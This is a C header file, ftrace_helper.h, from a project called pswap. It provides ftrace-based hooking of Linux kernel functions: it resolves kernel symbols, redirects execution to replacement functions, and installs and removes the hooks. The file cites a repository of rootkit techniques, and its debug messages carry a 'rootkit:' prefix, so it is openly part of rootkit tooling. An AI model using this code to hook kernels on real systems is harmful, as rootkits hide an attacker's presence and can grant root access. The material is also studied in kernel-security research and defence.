/****************************************************************************
 * Copyright (C) 2023 by xcellerator                                        *
 *                                                                          *
 * This file is part of pswap.                                              *
 *                                                                          *
 *   pswap is free software: you can redistribute it and/or modify it       *
 *   under the terms of the GNU Lesser General Public License as published  *
 *   by the Free Software Foundation, either version 3 of the License, or   *
 *   (at your option) any later version.                                    *
 *                                                                          *
 *   pswap is distributed in the hope that it will be useful,               *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          *
 *   GNU Lesser General Public License for more details.                    *
 *                                                                          *
 *   You should have received a copy of the GNU Lesser General Public       *
 *   License along with pswap.  If not, see <http://www.gnu.org/licenses/>. *
 ****************************************************************************/

/**
 * @file ftrace_helper.h
 * @author xcellerator, wintermute
 * @date 5/20/2023
 * @brief provides a wrapper for ftrace to hook kernel functions
 *
 * adapted for pswap and updated by wintermute
 *
 * @see https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.3_set_root/ftrace_helper.h
 */

#ifndef _FTRACE_HELPER_H_
#define _FTRACE_HELPER_H_

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "resolve_ksyms.h"


#define HOOK(_name, _hook, _orig)   \
{                                   \
    .name = (_name),                \
    .function = (_hook),            \
    .original = (_orig),            \
}

#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook) {
    hook->address = rk_kallsyms_lookup_name(hook->name);

    if (!hook->address) {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs) {
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->regs.ip = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->regs.ip = (unsigned long) hook->function;
    }
#endif
}

int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if (err) {
        return err;
    }

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "ftrace_helper: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) {
        printk(KERN_DEBUG "ftrace_helper: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err) {
            goto error;
        }
    }
    return 0;

error:
    while (i != 0) {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;

    for (i = 0 ; i < count ; i++) {
        fh_remove_hook(&hooks[i]);
    }
}

#endif
